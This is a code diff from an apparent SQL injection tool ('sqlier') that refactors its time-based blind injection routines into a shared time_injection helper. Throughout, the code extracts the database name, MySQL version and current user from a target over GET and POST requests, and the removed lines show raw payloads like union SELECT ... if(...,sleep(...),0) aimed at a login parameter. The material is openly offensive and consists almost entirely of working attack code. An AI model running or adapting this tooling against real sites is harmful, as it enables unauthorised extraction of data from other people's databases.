@@ -7,6 +7,7 @@ from sqlier.config import UnpackFunction
 from lib.data import DataProcess
 from lib.log import logger
 from lib.dealpayload import build_injection
+from lib.dealpayload import time_injection
 
 __author__ = "LoRexxar"
 
@@ -92,16 +93,11 @@ class SqliTest(BaseConfig):
                 # 先注database长度
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start database length sqli...")
-                for i in trange(50, desc="Database length sqli...", leave=False):
-                    # payload = "user=ddog123' union SELECT 1,if((select length(database()))>" + repr(
-                    #     i) + ",sleep(" + repr(self.time) + "),0) %23"
-                    payload = self.dealpayload.construct_time_payload(select="length(database())", compare=i)
-                    if self.Data.GetTimeData(payload, self.time) == 0:
-                        database_len = i
-                        break
-                    elif i == 50:
-                        logger.error("Database length > 50...")
-                        database_len = 50
+
+                retVal = time_injection(select="length(database())",
+                                        dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                        isCount=True, sqlirequest=self.sqlirequest)
+                database_len = int(retVal)
 
                 logger.debug("Database length sqli success...The database_len is %d..." % database_len)
                 print "[*] database_len: %d" % database_len
@@ -109,16 +105,13 @@ class SqliTest(BaseConfig):
 
                 # 再注database
                 logger.debug("Start database sqli...")
-                for i in range(1, database_len):
-                    for j in trange(100, desc='Database\'s %dth char sqli' % i, leave=False):
-                        # payload = "user=ddog123'union SELECT 1,if((select ascii(mid(database()," + repr(i) + ",1)))>" + repr(
-                        #     j + 30) + ",sleep(" + repr(self.time) + "),0) %23"
-                        payload = self.dealpayload.construct_time_payload(
-                            select="ascii(mid(database()," + repr(i) + ",1))",
-                            compare=(j + 30))
-                        if self.Data.GetTimeData(payload, self.time) == 0:
-                            database += chr(int(j + 30))
-                            break
+
+                for i in trange(database_len, leave=False):
+                    retVal = time_injection(select="ascii(mid(database()," + repr(i + 1) + ",1))",
+                                            dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                            isStrings=True, sqlirequest=self.sqlirequest)
+                    database += chr(retVal)
+
                 logger.debug("Database sqli success...The database is %s" % database)
                 print "[*] database: %s" % database
 
@@ -173,32 +166,24 @@ class SqliTest(BaseConfig):
                 # 先注database长度
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start database length sqli...")
-                for i in trange(50, desc="Database length sqli...", leave=False):
-                    # payload = {"user": "ddog123' union SELECT 1,if((select length(database()))>" + repr(
-                    #     i) + ",sleep(" + repr(self.time) + "),0) #", "passwd": "ddog123"}
-                    payload = self.dealpayload.construct_time_payload(select="length(database())", compare=i)
-                    if self.Data.PostTimeData(payload, self.time) == 0:
-                        database_len = i
-                        break
-                    elif i == 50:
-                        logger.error("Database length > 50...")
-                        database_len = 50
+
+                retVal = time_injection(select="length(database())",
+                                        dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                        isCount=True, sqlirequest=self.sqlirequest)
+                database_len = int(retVal)
 
                 logger.debug("Database length sqli success...The database_len is %d..." % database_len)
                 print "[*] database_len: %d" % database_len
 
                 # 再注database
                 logger.debug("Start database sqli...")
-                for i in range(1, database_len + 1):
-                    for j in trange(100, desc='Database\'s %dth cahr sqli' % i, leave=False):
-                        # payload = {"user": "ddog123' union SELECT 1,if((select ascii(mid(database()," + repr(i) + ",1)))>" + repr(
-                        #     j + 30) + ",sleep(" + repr(self.time) + "),0) #", "passwd": "ddog123"}
-                        payload = self.dealpayload.construct_time_payload(
-                            select="ascii(mid(database()," + repr(i) + ",1))",
-                            compare=(j + 30))
-                        if self.Data.PostTimeData(payload, self.time) == 0:
-                            database += chr(int(j + 30))
-                            break
+
+                for i in trange(database_len, leave=False):
+                    retVal = time_injection(select="ascii(mid(database()," + repr(i + 1) + ",1))",
+                                            dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                            isStrings=True, sqlirequest=self.sqlirequest)
+                    database += chr(retVal)
+
                 logger.debug("Database sqli success...The database is %s" % database)
                 print "[*] database: %s" % database
 
@@ -255,30 +240,24 @@ class SqliTest(BaseConfig):
                 # 先注version长度
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start version length sqli...")
-                for i in trange(30, desc="Version length sqli...", leave=False):
-                    # payload = "user=ddog123' union SELECT 1,if((select length(version()))>" + repr(
-                    #     i) + ",sleep(" + repr(self.time) + "),0) %23"
-                    payload = self.dealpayload.construct_time_payload(select="length(version())", compare=i)
-                    if self.Data.GetTimeData(payload, self.time) == 0:
-                        version_len = i
-                        break
+
+                retVal = time_injection(select="length(version())",
+                                        dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                        isCount=True, sqlirequest=self.sqlirequest)
+                version_len = int(retVal)
 
                 logger.debug("Version length sqli success...The version_len is %d..." % version_len)
                 print "[*] version_len: %d" % version_len
 
                 # 再注version
                 logger.debug("Start version sqli...")
-                for i in range(1, version_len + 1):
-                    for j in trange(100, desc='Version\'s %dth char sqli' % i, leave=False):
-                        # payload = "user=ddog123'union SELECT 1,if((select ascii(mid(version()," + repr(
-                        #     i) + ",1)))>" + repr(
-                        #     j + 30) + ",sleep(" + repr(self.time) + "),0) %23"
-                        payload = self.dealpayload.construct_time_payload(
-                            select="ascii(mid(version()," + repr(i) + ",1))",
-                            compare=(j + 30))
-                        if self.Data.GetTimeData(payload, self.time) == 0:
-                            version += chr(int(j + 30))
-                            break
+
+                for i in trange(version_len, leave=False):
+                    retVal = time_injection(select="ascii(mid(version()," + repr(i + 1) + ",1))",
+                                            dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                            isStrings=True, sqlirequest=self.sqlirequest)
+                    version += chr(retVal)
+
                 logger.debug("Version sqli success...The version is %s" % version)
                 print "[*] version: %s" % version
 
@@ -333,13 +312,11 @@ class SqliTest(BaseConfig):
                 # 先注version长度
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start version length sqli...")
-                for i in trange(30, desc="Version length sqli...", leave=False):
-                    # payload = {"user": "ddog123' union SELECT 1,if((select length(version()))>" + repr(
-                    #     i) + ",sleep(" + repr(self.time) + "),0) #", "passwd": "ddog123"}
-                    payload = self.dealpayload.construct_time_payload(select="length(version())", compare=i)
-                    if self.Data.PostTimeData(payload, self.time) == 0:
-                        version_len = i
-                        break
+
+                retVal = time_injection(select="length(version())",
+                                        dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                        isCount=True, sqlirequest=self.sqlirequest)
+                version_len = int(retVal)
 
                 logger.debug("Version length sqli success...The version_len is %d..." % version_len)
                 print "[*] version_len: %d" % version_len
@@ -347,17 +324,13 @@ class SqliTest(BaseConfig):
 
                 # 再注version
                 logger.debug("Start version sqli...")
-                for i in range(1, version_len + 1):
-                    for j in trange(100, desc='Version\'s %dth char sqli' % i, leave=False):
-                        # payload = {"user": "ddog123' union SELECT 1,if((select ascii(mid(version()," + repr(
-                        #     i) + ",1)))>" + repr(
-                        #     j + 30) + ",sleep(" + repr(self.time) + "),0) #", "passwd": "ddog123"}
-                        payload = self.dealpayload.construct_time_payload(
-                            select="ascii(mid(version()," + repr(i) + ",1))",
-                            compare=(j + 30))
-                        if self.Data.PostTimeData(payload, self.time) == 0:
-                            version += chr(int(j + 30))
-                            break
+
+                for i in trange(version_len, leave=False):
+                    retVal = time_injection(select="ascii(mid(version()," + repr(i + 1) + ",1))",
+                                            dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                            isStrings=True, sqlirequest=self.sqlirequest)
+                    version += chr(retVal)
+
                 logger.debug("Version sqli success...The version is %s" % version)
                 print "[*] version: %s" % version
 
@@ -416,16 +389,11 @@ class SqliTest(BaseConfig):
                 # 先注user长度
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start user length sqli...")
-                for i in trange(50, desc="User length sqli...", leave=False):
-                    # payload = "user=ddog123' union SELECT 1,if((select length(user()))>" + repr(
-                    #     i) + ",sleep(" + repr(self.time) + "),0) %23"
-                    payload = self.dealpayload.construct_time_payload(select="length(user())", compare=i)
-                    if self.Data.GetTimeData(payload, self.time) == 0:
-                        user_len = i
-                        break
-                    elif i == 50:
-                        logger.error("user length > 50")
-                        user_len = 50
+
+                retVal = time_injection(select="length(user())",
+                                        dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                        isCount=True, sqlirequest=self.sqlirequest)
+                user_len = int(retVal)
 
                 logger.debug("User length sqli success...The user_len is %d..." % user_len)
                 print "[*] user_len: %d" % user_len
@@ -433,17 +401,13 @@ class SqliTest(BaseConfig):
 
                 # 再注user
                 logger.debug("Start user sqli...")
-                for i in range(1, user_len):
-                    for j in trange(100, desc='User\'s %dth char sqli' % i, leave=False):
-                        # payload = "user=ddog123'union SELECT 1,if((select ascii(mid(user()," + repr(
-                        #     i) + ",1)))>" + repr(
-                        #     j + 30) + ",sleep(" + repr(self.time) + "),0) %23"
-                        payload = self.dealpayload.construct_time_payload(
-                            select="ascii(mid(user()," + repr(i) + ",1))",
-                            compare=(j + 30))
-                        if self.Data.GetTimeData(payload, self.time) == 0:
-                            user += chr(int(j + 30))
-                            break
+
+                for i in trange(user_len, leave=False):
+                    retVal = time_injection(select="ascii(mid(user()," + repr(i + 1) + ",1))",
+                                            dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                            isStrings=True, sqlirequest=self.sqlirequest)
+                    user += chr(retVal)
+
                 logger.debug("user sqli success...The user is %s" % user)
                 print "[*] user: %s" % user
 
@@ -498,16 +462,11 @@ class SqliTest(BaseConfig):
                 # 先注user长度
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start user length sqli...")
-                for i in trange(50, desc="User length sqli...", leave=False):
-                    # payload = {"user": "ddog123' union SELECT 1,if((select length(user()))>" + repr(
-                    #     i) + ",sleep(" + repr(self.time) + "),0) #", "passwd": "ddog123"}
-                    payload = self.dealpayload.construct_time_payload(select="length(user())", compare=i)
-                    if self.Data.PostTimeData(payload, self.time) == 0:
-                        user_len = i
-                        break
-                    elif i == 50:
-                        logger.error("user length > 50")
-                        user_len = 50
+
+                retVal = time_injection(select="length(user())",
+                                        dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                        isCount=True, sqlirequest=self.sqlirequest)
+                user_len = int(retVal)
 
                 logger.debug("user length sqli success...The user_len is %d..." % user_len)
                 print "[*] user_len: %d" % user_len
@@ -515,16 +474,12 @@ class SqliTest(BaseConfig):
 
                 # 再注user
                 logger.debug("Start user sqli...")
-                for i in range(1, user_len):
-                    for j in trange(100, desc='User\'s %dth char sqli' % i, leave=False):
-                        # payload = {"user": "ddog123' union SELECT 1,if((select ascii(mid(user()," + repr(
-                        #     i) + ",1)))>" + repr(
-                        #     j + 30) + ",sleep(" + repr(self.time) + "),0) #", "passwd": "ddog123"}
-                        payload = self.dealpayload.construct_time_payload(
-                            select="ascii(mid(user()," + repr(i) + ",1))",
-                            compare=(j + 30))
-                        if self.Data.PostTimeData(payload, self.time) == 0:
-                            user += chr(int(j + 30))
-                            break
+
+                for i in trange(user_len, leave=False):
+                    retVal = time_injection(select="ascii(mid(user()," + repr(i + 1) + ",1))",
+                                            dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                            isStrings=True, sqlirequest=self.sqlirequest)
+                    user += chr(retVal)
+
                 logger.debug("User sqli success...The user is %s" % user)
                 print "[*] user: %s" % user
